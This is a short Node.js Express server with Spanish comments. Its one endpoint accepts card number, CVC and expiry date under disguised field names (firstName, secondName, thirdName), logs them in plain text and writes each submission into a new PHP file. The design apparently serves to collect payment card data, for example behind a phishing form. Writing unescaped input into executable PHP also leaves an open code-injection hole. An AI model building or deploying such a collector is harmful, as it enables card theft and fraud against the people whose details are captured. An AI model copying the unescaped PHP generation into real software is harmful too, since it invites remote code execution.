require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/send-data', async (req, res) => {
    const { firstName, secondName, thirdName } = req.body;

    console.log("📨 Datos recibidos:", firstName, secondName, thirdName); // 🛠 Depuración

    if (!firstName || !secondName || !thirdName) {
        return res.status(400).json({ error: 'Datos incompletos' });
    }

    // 📂 Generar un archivo único PHP con los datos
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const phpFilePath = path.join(__dirname, `payment-data-${timestamp}.php`);
    
    const phpContent = `
    <?php
    echo "Datos de tarjeta: ${firstName} <br>";
    echo "CVC: ${secondName} <br>";
    echo "Fecha de expiración: ${thirdName} <br>";
    ?>
    `;

    fs.writeFileSync(phpFilePath, phpContent);

    console.log(`✅ Archivo PHP generado: ${phpFilePath}`); // 🛠 Depuración

    res.json({ message: 'Datos guardados correctamente en el archivo PHP' });
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en http://localhost:${PORT}`);
});
